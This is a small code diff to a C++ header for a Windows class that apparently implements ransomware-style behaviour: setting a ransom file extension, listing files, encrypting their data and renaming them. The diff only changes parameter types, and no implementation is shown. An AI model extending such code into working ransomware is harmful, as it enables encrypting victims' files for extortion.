@@ -24,14 +24,14 @@ namespace win {
 
 	public:
 		bool SetRansomExtension(std::vector<std::wstring>* ext_list);
-		DWORD RansomeData(std::wstring_view target_path);
+		DWORD RansomeData(const std::wstring& target_path);
 	private:
-		std::wstring ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path);
-		DWORD EncryptFileData(std::wstring_view target_file_path);
+		std::wstring ChangeFilenameExtensionForEncrypt(const std::wstring& target_file_path);
+		DWORD EncryptFileData(const std::wstring& target_file_path);
 		std::wstring GetExtension(const std::wstring& file_name);
 		std::wstring GetExtension2(const std::wstring& file_name);
 		bool CheckFileExtension(const std::wstring& file_name, const std::vector<std::wstring>& extension_list);
-		DWORD GetFileList(std::wstring_view path, std::vector<std::wstring>* text_files);
+		DWORD GetFileList(const std::wstring& path, std::vector<std::wstring>* text_files);
 
 	private:
 		std::vector<std::wstring> ext_List_;
